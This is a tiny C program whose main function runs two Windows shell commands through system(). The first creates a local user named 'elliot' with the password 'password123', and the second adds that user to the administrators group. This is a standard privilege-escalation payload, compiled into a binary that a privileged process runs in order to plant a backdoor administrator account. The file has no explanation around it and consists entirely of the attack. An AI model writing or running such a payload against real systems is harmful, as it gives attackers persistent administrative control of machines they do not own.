#include <stdlib.h>
int main() {
    int i; 
    i = system("net user elliot password123 /add");
    i = system("net localgroup administrators elliot /add");
    return 0;
}
